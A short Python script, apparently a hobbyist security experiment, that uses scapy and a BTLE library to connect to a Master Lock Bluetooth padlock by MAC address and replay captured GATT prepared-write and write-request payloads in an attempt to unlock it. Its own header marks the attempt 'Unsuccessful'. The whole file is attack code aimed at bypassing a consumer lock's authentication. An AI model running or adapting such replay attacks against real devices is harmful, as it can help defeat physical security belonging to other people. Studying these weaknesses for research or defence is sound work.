#!/bin/python

# Unlock Masterlock
# Unsuccessful

# Masterlock 	54:4A:16:3B:A9:0F 
# Host 			98:58:8A:05:09:45

import time
from scapy.all import *
from BTLE import *

def main():
	s = bindsock()
	rand = "00"
	Connect(s, "0FA93B164A54",rand)

	writereq(s, "0E00","0100")
	prepwrite(s, "0000","0D00","0080781719be690036db82ffc779e7ba0c02")
	prepwrite(s, "1200","0D00","36b35f5d5a9c3c1dcf3fa3eed9da08e2b224")
	prepwrite(s, "2400","0D00","a06cb04565e37671aea039266b692e470634")
	prepwrite(s, "3600","0D00","eea0678833c5e3f541f774d8dd88c00bc6")

	execwrite(s)
	time.sleep(1)

	writereq(s, "0D00","01000194beaa6ae6675ee288")
	writereq(s, "0E00","0100")
	writereq(s, "0D00","010001568f386d57976dea22")
	writereq(s, "0E00","0100")
	writereq(s, "0D00","01000121cc9d2f9919301591")

	time.sleep(5)
	disconnect(s)

if __name__ == "__main__":
    main()
